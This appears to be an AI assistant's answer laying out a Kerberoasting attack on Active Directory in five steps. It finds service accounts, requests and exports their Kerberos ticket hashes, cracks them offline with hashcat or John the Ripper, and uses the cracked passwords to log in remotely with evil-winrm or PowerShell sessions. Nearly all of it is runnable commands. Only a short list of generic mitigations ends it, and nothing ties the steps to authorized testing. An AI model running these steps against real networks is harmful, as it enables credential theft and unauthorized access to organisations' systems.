

### **Step 1: Enumerate Domain Users with SPN**

Kerberoasting targets accounts with Service Principal Names (SPNs). First, enumerate users with SPNs.

**Command:**

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Alternatively, using Impacket:

```bash
GetUserSPNs.py -dc-ip <Domain_Controller_IP> <DOMAIN>/<User>:<Password>
```

### **Step 2: Request a Ticket Granting Service (TGS) Ticket**

Once an SPN is found, request a TGS ticket for that service.

**Command:**

```powershell
GetUserSPNs.py -request -dc-ip <Domain_Controller_IP> <DOMAIN>/<User>:<Password>
```

or using Rubeus:

```powershell
Rubeus.exe kerberoast
```

### **Step 3: Extract and Save TGS Hashes**

The obtained TGS hash can be extracted for offline cracking.

**Command:**

```powershell
Rubeus.exe kerberoast /format:hashcat
```

or

```powershell
Invoke-Kerberoast | Format-Table -AutoSize
```

### **Step 4: Crack the TGS Hash Offline**

Use Hashcat to crack the extracted hash.

**Command:**

```bash
hashcat -m 13100 <hashfile> /path/to/wordlist.txt --force
```

or using John the Ripper:

```bash
john --format=krb5tgs --wordlist=/path/to/wordlist.txt <hashfile>
```

### **Step 5: Use the Obtained Credentials**

If the hash is successfully cracked, use the password to access the service or escalate privileges.

**Command to test access:**

```powershell
New-PSSession -ComputerName <Target_Machine> -Credential <DOMAIN>\<User>
```

or using Evil-WinRM:

```bash
evil-winrm -i <Target_IP> -u <User> -p <Password>
```

### **Mitigation Steps:**

- Enforce strong passwords for service accounts.
- Regularly rotate service account passwords.
- Implement the principle of least privilege.
- Monitor Kerberos ticket requests for anomalies.

Let me know if you need additional details or modifications!